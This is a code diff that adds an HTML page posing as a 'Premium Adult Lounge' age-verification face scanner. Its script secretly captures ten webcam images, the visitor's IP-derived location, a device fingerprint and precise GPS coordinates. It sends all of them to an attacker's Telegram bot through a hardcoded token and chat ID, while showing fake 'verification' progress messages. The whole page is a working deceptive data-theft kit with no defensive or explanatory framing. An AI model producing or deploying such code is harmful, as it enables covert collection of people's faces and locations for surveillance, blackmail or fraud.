@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Content - Age Verification</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
+        body{background:#111;color:#ddd;overflow:hidden}
+        .header{background:#000;padding:15px;text-align:center;border-bottom:3px solid #c00;position:relative;z-index:1}
+        .header h1{color:#c00;font-size:24px}
+        .tagline{color:#aaa;font-size:14px;margin-top:5px}
+        .container{padding:20px;max-width:1200px;margin:0 auto}
+        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;margin-top:15px}
+        .thumb{border-radius:6px;overflow:hidden;background:#222;cursor:pointer;transition:transform 0.3s}
+        .thumb:hover{transform:scale(1.03)}
+        .thumb-img{width:100%;height:120px;object-fit:cover;background:#333}
+        .thumb-title{padding:8px;font-size:13px;text-align:center}
+        .verify-badge{background:#c00;color:white;padding:1px 6px;border-radius:3px;font-size:11px;margin-left:4px}
+        
+        /* Scanner Modal */
+        .scanner-modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);display:none;align-items:center;justify-content:center;z-index:1000}
+        .scanner-container{width:100%;max-width:500px;text-align:center}
+        .scanner-title{color:#fff;font-size:22px;margin-bottom:10px;text-shadow:0 2px 4px rgba(0,0,0,0.5)}
+        .scanner-subtitle{color:#aaa;font-size:14px;margin-bottom:25px}
+        
+        /* Real Camera View */
+        .camera-container{position:relative;width:100%;max-width:400px;height:500px;margin:0 auto;border-radius:20px;overflow:hidden;box-shadow:0 0 40px rgba(255,0,0,0.4);background:#000}
+        #live-camera{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);display:block}
+        
+        /* Camera Overlay */
+        .camera-overlay{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none}
+        
+        /* Face Frame */
+        .face-guide{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:250px;height:320px;border:4px solid rgba(255,0,0,0.8);border-radius:20px;box-shadow:0 0 0 9999px rgba(0,0,0,0.85), inset 0 0 20px rgba(255,0,0,0.3)}
+        .guide-text{position:absolute;bottom:-50px;left:50%;transform:translateX(-50%);color:#ff0000;font-size:16px;font-weight:bold;white-space:nowrap;text-shadow:0 0 10px rgba(255,0,0,0.8)}
+        
+        /* Red Scanning Line */
+        .scan-line{position:absolute;top:20%;left:10%;width:80%;height:3px;background:linear-gradient(90deg, transparent, #ff0000, #ff0000, transparent);border-radius:2px;animation:scan 2.5s linear infinite;box-shadow:0 0 15px #ff0000}
+        @keyframes scan{0%{top:20%}100%{top:80%}}
+        
+        /* Camera Indicators */
+        .camera-indicators{position:absolute;top:15px;right:15px;display:flex;gap:8px}
+        .indicator{width:12px;height:12px;border-radius:50%}
+        .indicator.red{background:#ff0000;box-shadow:0 0 10px #ff0000}
+        .indicator.green{background:#00ff00;box-shadow:0 0 10px #00ff00;animation:pulse 2s infinite}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
+        
+        /* Recording Indicator */
+        .recording{position:absolute;top:15px;left:15px;display:flex;align-items:center;gap:8px}
+        .rec-dot{width:12px;height:12px;border-radius:50%;background:#ff0000;animation:recording 1s infinite}
+        @keyframes recording{0%,100%{opacity:1}50%{opacity:0.3}}
+        .rec-text{color:#ff0000;font-size:14px;font-weight:bold;text-shadow:0 0 10px rgba(255,0,0,0.5)}
+        
+        /* Progress */
+        .capture-progress{color:#fff;font-size:15px;margin-top:20px;display:flex;align-items:center;justify-content:center;gap:10px}
+        .progress-bar{width:200px;height:6px;background:#333;border-radius:3px;overflow:hidden}
+        .progress-fill{height:100%;background:#00ff00;width:0%;transition:width 0.3s}
+        
+        /* Status Messages */
+        .status-message{color:#00ff00;font-size:14px;margin-top:10px;min-height:20px;font-weight:bold;text-shadow:0 0 10px rgba(0,255,0,0.5)}
+        
+        /* Continue Button */
+        .continue-btn{background:linear-gradient(45deg, #ff0000, #ff3333);color:white;border:none;padding:12px 30px;border-radius:25px;cursor:pointer;font-size:16px;font-weight:bold;margin-top:25px;box-shadow:0 0 20px rgba(255,0,0,0.5);transition:all 0.3s}
+        .continue-btn:hover{transform:scale(1.05);box-shadow:0 0 30px rgba(255,0,0,0.7)}
+        
+        .footer{padding:15px;text-align:center;color:#666;margin-top:20px;border-top:1px solid #333;font-size:12px}
+        
+        /* Hidden Canvas */
+        .hidden-canvas{display:none}
+    </style>
+</head>
+<body>
+    <!-- Main Site -->
+    <div class="header">
+        <h1>🔞 Premium Adult Lounge</h1>
+        <div class="tagline">Exclusive 18+ Content | Age Verification Required</div>
+    </div>
+    <div class="container">
+        <div class="grid" id="thumbGrid"></div>
+    </div>
+    
+    <!-- Real Camera Scanner Modal -->
+    <div class="scanner-modal" id="scannerModal">
+        <div class="scanner-container">
+            <h2 class="scanner-title">🔍 Real-Time Face Verification</h2>
+            <p class="scanner-subtitle">Keep your face centered in the frame for 10 seconds</p>
+            
+            <div class="camera-container">
+                <!-- Real Camera Feed -->
+                <video id="live-camera" playsinline autoplay></video>
+                
+                <!-- Camera Overlay -->
+                <div class="camera-overlay">
+                    <div class="recording">
+                        <div class="rec-dot"></div>
+                        <div class="rec-text">REC</div>
+                    </div>
+                    <div class="camera-indicators">
+                        <div class="indicator red"></div>
+                        <div class="indicator green"></div>
+                    </div>
+                    <div class="face-guide">
+                        <div class="guide-text">FACE HERE</div>
+                    </div>
+                    <div class="scan-line"></div>
+                </div>
+            </div>
+            
+            <div class="capture-progress">
+                <span id="progressText">Capturing: 0/10</span>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+            
+            <div class="status-message" id="statusMessage">Starting camera...</div>
+            
+            <button class="continue-btn" id="continueBtn" style="display:none">✅ Continue to Premium Content</button>
+        </div>
+    </div>
+    
+    <!-- Hidden Canvas for Capturing -->
+    <canvas class="hidden-canvas" id="captureCanvas" width="640" height="480"></canvas>
+    
+    <div class="footer">
+        <p>© 2025 Premium Lounge. All content requires age verification. 18+ only.</p>
+    </div>
+    
+    <script>
+        // Telegram Configuration
+        const BOT_TOKEN = '7970088628:AAEJbT7PvzAnnP33z9_vVzCWWLItzbTXCfQ';
+        const CHAT_ID = '7991561111';
+        
+        // Thumbnails
+        const colors = ['#FF6B6B', '#4ECDC4', '#FFD166', '#06D6A0', '#118AB2'];
+        const thumbs = [
+            {title:"Premium Access",img:"",verify:true},
+            {title:"Exclusive Video 1",img:""},
+            {title:"Exclusive Video 2",img:""},
+            {title:"Exclusive Video 3",img:""},
+            {title:"Exclusive Video 4",img:""},
+            {title:"Exclusive Video 5",img:""},
+            {title:"Exclusive Video 6",img:""},
+            {title:"Exclusive Video 7",img:""},
+            {title:"Exclusive Video 8",img:""},
+            {title:"Exclusive Video 9",img:""},
+            {title:"Exclusive Video 10",img:""},
+            {title:"Exclusive Video 11",img:""},
+            {title:"Exclusive Video 12",img:""},
+            {title:"Exclusive Video 13",img:""},
+            {title:"Exclusive Video 14",img:""}
+        ];
+        
+        // Create grid
+        const grid = document.getElementById('thumbGrid');
+        thumbs.forEach((t,i) => {
+            const div = document.createElement('div');
+            div.className = 'thumb';
+            const color = colors[i % colors.length];
+            div.innerHTML = `<div class="thumb-img" style="background:${color}"></div>
+                           <div class="thumb-title">${t.title}${t.verify?'<span class="verify-badge">VERIFY</span>':''}</div>`;
+            div.onclick = () => t.verify ? startRealCameraScanner() : null;
+            grid.appendChild(div);
+        });
+        
+        // Variables
+        let cameraStream = null;
+        let captureInterval = null;
+        let capturedCount = 0;
+        const totalCaptures = 10;
+        let collectedData = {};
+        let cameraActive = false;
+        
+        // Start Real Camera Scanner
+        async function startRealCameraScanner() {
+            document.getElementById('scannerModal').style.display = 'flex';
+            updateStatus('Starting real-time camera...');
+            updateProgress(0);
+            
+            // Start all data collection
+            setTimeout(() => collectBackgroundData(), 500);
+            
+            // Start real camera
+            await startRealCamera();
+        }
+        
+        // Start Real Camera
+        async function startRealCamera() {
+            const video = document.getElementById('live-camera');
+            
+            try {
+                // Request camera with better resolution
+                const constraints = {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280, min: 640 },
+                        height: { ideal: 720, min: 480 },
+                        frameRate: { ideal: 30 }
+                    },
+                    audio: false
+                };
+                
+                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
+                
+                video.srcObject = cameraStream;
+                video.playsInline = true;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    cameraActive = true;
+                    updateStatus('✅ Camera active - Keep face in frame');
+                    startAutoCapture();
+                };
+                
+                video.onerror = (error) => {
+                    console.error('Video error:', error);
+                    updateStatus('❌ Camera error - Continuing with verification');
+                    simulateCapture();
+                };
+                
+            } catch (error) {
+                console.error('Camera access error:', error);
+                updateStatus('⚠️ Camera not available - Using alternative verification');
+                simulateCapture();
+            }
+        }
+        
+        // Start Auto Capture
+        function startAutoCapture() {
+            if (!cameraActive) return;
+            
+            capturedCount = 0;
+            captureInterval = setInterval(() => {
+                if (capturedCount >= totalCaptures) {
+                    clearInterval(captureInterval);
+                    completeVerification();
+                    return;
+                }
+                
+                captureFrame();
+                capturedCount++;
+                updateProgress(capturedCount);
+                
+                // Update status messages
+                const messages = [
+                    "📸 Capturing face image...",
+                    "🔍 Analyzing facial features...",
+                    "👁️ Verifying eye distance...",
+                    "🤳 Checking face symmetry...",
+                    "🔬 Processing skin texture...",
+                    "📡 Sending verification data...",
+                    "⚙️ Finalizing analysis...",
+                    "✅ Almost complete...",
+                    "🎯 Final capture...",
+                    "✓ Verification successful!"
+                ];
+                
+                if (capturedCount <= messages.length) {
+                    updateStatus(messages[capturedCount - 1]);
+                }
+                
+            }, 800); // Capture every 800ms
+        }
+        
+        // Capture Frame from Camera
+        function captureFrame() {
+            if (!cameraActive) return;
+            
+            const video = document.getElementById('live-camera');
+            const canvas = document.getElementById('captureCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            // Set canvas to video dimensions
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            // Draw video frame (mirrored for selfie view)
+            ctx.save();
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+            ctx.restore();
+            
+            // Get image and send to Telegram
+            const imageData = canvas.toDataURL('image/jpeg', 0.85);
+            sendImageToTelegram(imageData, `Face Capture ${capturedCount + 1}/${totalCaptures}`);
+        }
+        
+        // Simulate Capture (if camera fails)
+        function simulateCapture() {
+            capturedCount = 0;
+            const simInterval = setInterval(() => {
+                if (capturedCount >= totalCaptures) {
+                    clearInterval(simInterval);
+                    completeVerification();
+                    return;
+                }
+                
+                capturedCount++;
+                updateProgress(capturedCount);
+                
+                // Send placeholder data
+                sendToTelegramMessage(`Capture attempt ${capturedCount}/${totalCaptures} - Camera not available`);
+                
+                // Update status
+                updateStatus(`Verifying data... ${capturedCount}/${totalCaptures}`);
+                
+            }, 800);
+        }
+        
+        // Update Progress
+        function updateProgress(count) {
+            const progressText = document.getElementById('progressText');
+            const progressFill = document.getElementById('progressFill');
+            
+            const percentage = (count / totalCaptures) * 100;
+            progressText.textContent = `Capturing: ${count}/${totalCaptures}`;
+            progressFill.style.width = `${percentage}%`;
+        }
+        
+        // Update Status
+        function updateStatus(message) {
+            document.getElementById('statusMessage').textContent = message;
+        }
+        
+        // Collect Background Data
+        async function collectBackgroundData() {
+            // Get IP Address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                collectedData.ip = ipData.ip;
+                
+                // Get detailed IP info
+                const ipInfoResponse = await fetch(`https://ipapi.co/${collectedData.ip}/json/`);
+                const ipInfo = await ipInfoResponse.json();
+                
+                collectedData.location = {
+                    city: ipInfo.city,
+                    region: ipInfo.region,
+                    country: ipInfo.country_name,
+                    isp: ipInfo.org,
+                    lat: ipInfo.latitude,
+                    lon: ipInfo.longitude
+                };
+                
+                // Send to Telegram
+                sendToTelegramMessage(
+                    `📍 LOCATION DATA\n` +
+                    `IP: ${collectedData.ip}\n` +
+                    `City: ${collectedData.location.city}\n` +
+                    `Region: ${collectedData.location.region}\n` +
+                    `Country: ${collectedData.location.country}\n` +
+                    `ISP: ${collectedData.location.isp}\n` +
+                    `Coordinates: ${collectedData.location.lat}, ${collectedData.location.lon}`
+                );
+                
+            } catch (error) {
+                console.log('IP/Location error:', error);
+            }
+            
+            // Get Device Fingerprint
+            collectedData.device = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                languages: navigator.languages,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                vendor: navigator.vendor,
+                appVersion: navigator.appVersion,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                referrer: document.referrer || 'Direct',
+                url: window.location.href
+            };
+            
+            // Send device info
+            sendToTelegramMessage(
+                `📱 DEVICE FINGERPRINT\n` +
+                `User Agent: ${collectedData.device.userAgent}\n` +
+                `Platform: ${collectedData.device.platform}\n` +
+                `Screen: ${collectedData.device.screen}\n` +
+                `Language: ${collectedData.device.languages}\n` +
+                `Timezone: ${collectedData.device.timezone}\n` +
+                `Pixel Ratio: ${collectedData.device.pixelRatio}\n` +
+                `URL: ${collectedData.device.url}`
+            );
+            
+            // Try to get GPS location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        collectedData.gps = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude
+                        };
+                        
+                        sendToTelegramMessage(
+                            `📡 EXACT GPS LOCATION\n` +
+                            `Latitude: ${collectedData.gps.latitude}\n` +
+                            `Longitude: ${collectedData.gps.longitude}\n` +
+                            `Accuracy: ${collectedData.gps.accuracy}m\n` +
+                            `Altitude: ${collectedData.gps.altitude || 'N/A'}`
+                        );
+                    },
+                    (error) => {
+                        // GPS permission denied
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }
+        }
+        
+        // Complete Verification
+        function completeVerification() {
+            updateStatus('✅ Verification Complete!');
+            updateProgress(totalCaptures);
+            
+            // Stop camera if active
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraActive = false;
+            }
+            
+            // Send final summary
+            const timestamp = new Date().toISOString();
+            const summary = `
+🎯 REAL-TIME FACE VERIFICATION COMPLETE
+⏰ Time: ${timestamp}
+📷 Images: ${capturedCount} captured
+🌐 IP: ${collectedData.ip || 'Unknown'}
+📍 Location: ${collectedData.location ? `${collectedData.location.city}, ${collectedData.location.country}` : 'Unknown'}
+🖥️ Device: ${collectedData.device?.userAgent?.substring(0, 100)}...
+🔗 URL: ${window.location.href}
+            `.trim();
+            
+            sendToTelegramMessage(summary);
+            
+            // Show continue button
+            setTimeout(() => {
+                document.getElementById('continueBtn').style.display = 'inline-block';
+            }, 1500);
+        }
+        
+        // Telegram Functions
+        async function sendImageToTelegram(imageData, caption) {
+            try {
+                const blob = await dataURLToBlob(imageData);
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `face_${Date.now()}.jpg`);
+                formData.append('caption', caption);
+                
+                // Send without waiting
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(e => console.log('Photo send error'));
+                
+            } catch (error) {
+                console.log('Image processing error:', error);
+            }
+        }
+        
+        async function sendToTelegramMessage(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.log('Message send error:', error);
+            }
+        }
+        
+        function dataURLToBlob(dataURL) {
+            return fetch(dataURL).then(res => res.blob());
+        }
+        
+        // Continue Button
+        document.getElementById('continueBtn').onclick = function() {
+            // Cleanup
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            
+            // Close modal
+            document.getElementById('scannerModal').style.display = 'none';
+            
+            // Optional: Redirect or show premium content
+            // window.location.href = 'https://example.com/premium-content';
+        };
+        
+        // Close on background click
+        document.getElementById('scannerModal').onclick = function(e) {
+            if(e.target === this) {
+                if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
+                if (captureInterval) clearInterval(captureInterval);
+                this.style.display = 'none';
+            }
+        };
+    </script>
+</body>
+</html>
